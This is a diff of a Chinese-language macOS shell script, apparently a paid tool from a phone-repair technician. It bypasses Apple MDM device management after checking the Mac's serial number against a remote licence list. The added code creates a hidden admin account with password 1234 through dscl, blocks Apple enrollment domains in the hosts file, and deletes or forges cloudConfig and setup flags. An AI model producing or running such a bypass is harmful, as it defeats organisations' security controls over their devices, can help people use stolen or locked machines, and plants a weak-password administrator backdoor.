@@ -1,43 +1,53 @@
 #!/bin/sh
-# ==========================================================
-#        HUA QIANG BEI XIAO HU - MDM EXPERT SYSTEM
-# ==========================================================
+# ============================================
+# 华强北小胡 - MDM 终极全兼容版
+# ============================================
 
+# 1. 云端授权验证
 SN=$(ioreg -l | grep IOPlatformSerialNumber | awk -F'"' '{print $4}')
-echo "----------------------------------------------------------"
-echo "  [正在连接云端] ............................ OK"
+echo "正在验证序列号: $SN ..."
+
+# 核心：增加 -L 追踪重定向，确保读取到最新的 sn.txt
 CHECK=$(curl -fsSL https://humdm.github.io/mdm-tools/sn.txt | grep "$SN")
 
 if [ -z "$CHECK" ]; then
-    echo "  [授权状态] ................................ ❌ 未授权"
-    echo "----------------------------------------------------------"
-    echo "  请联系胡师傅: 18682333383 | 微信: huhu-019"
+    echo "------------------------------------------------"
+    echo "❌ 授权失败！当前 SN: $SN 未入库"
+    echo "请联系胡师傅开通：18682333383"
+    echo "------------------------------------------------"
     exit 1
 fi
 
-echo "  [授权状态] ................................ ✅ 已通过"
-echo "----------------------------------------------------------"
+echo "✅ 授权成功！正在进入专家模式..."
 
-# 菜单部分加了边框设计，即使黑白屏也很专业
-while true; do
-    echo ""
-    echo "  +----------------------------------------------------+"
-    echo "  |         华 强 北 小 胡 - MDM 自动绕过系统          |"
-    echo "  +----------------------------------------------------+"
-    echo "    [1] ➤ 一键全自动绕过MDM (推荐)"
-    echo "    [2] ➤ 屏蔽 MDM 监管域名 (手动)"
-    echo "    [3] ➤ 禁用 MDM 注册通知 (清理)"
-    echo "    [4] ➤ 检测 MDM 监管状态 (验证)"
-    echo "    [5] ➤ 立即重启 MacBook"
-    echo "    [q] ➤ 退出"
-    echo "  +----------------------------------------------------+"
-    echo -n "  请选择操作序列: "
-    read opt
+# 2. 磁盘准备
+diskutil mount "Macintosh HD" >/dev/null 2>&1
+mount -uw /Volumes/Macintosh\ HD >/dev/null 2>&1
+if [ -d "/Volumes/Macintosh HD - Data" ]; then
+    diskutil rename "Macintosh HD - Data" "Data" >/dev/null 2>&1
+fi
 
-    case $opt in
-        1)
-            # 这里放之前的绕过逻辑...
-            echo ">>> 正在执行..." ;;
-        # ... 其他选项保持不变
-    esac
+# 3. 自动化绕过逻辑 (默认密码 1234)
+D="/Volumes/Data/private/var/db/dslocal/nodes/Default"
+mkdir -p "/Volumes/Data/Users/mac"
+dscl -f "$D" localhost -create "/Local/Default/Users/mac" UserShell "/bin/zsh"
+dscl -f "$D" localhost -create "/Local/Default/Users/mac" RealName "MacBook"
+dscl -f "$D" localhost -create "/Local/Default/Users/mac" UniqueID "501"
+dscl -f "$D" localhost -create "/Local/Default/Users/mac" PrimaryGroupID "20"
+dscl -f "$D" localhost -create "/Local/Default/Users/mac" NFSHomeDirectory "/Users/mac"
+dscl -f "$D" localhost -passwd "/Local/Default/Users/mac" "1234"
+dscl -f "$D" localhost -append "/Local/Default/Groups/admin" GroupMembership "mac"
+
+# 屏蔽域名
+H="/Volumes/Macintosh\ HD/etc/hosts"
+for d in deviceenrollment.apple.com mdmenrollment.apple.com iprofiles.apple.com acmdm.apple.com albert.apple.com; do
+    echo "127.0.0.1 $d" >> $H
 done
+
+# 注入标志
+touch /Volumes/Data/private/var/db/.AppleSetupDone
+rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfig*
+touch /Volumes/Data/private/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
+touch /Volumes/Data/private/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
+
+echo "🎉 处理完成！请直接输入 reboot 重启电脑。"
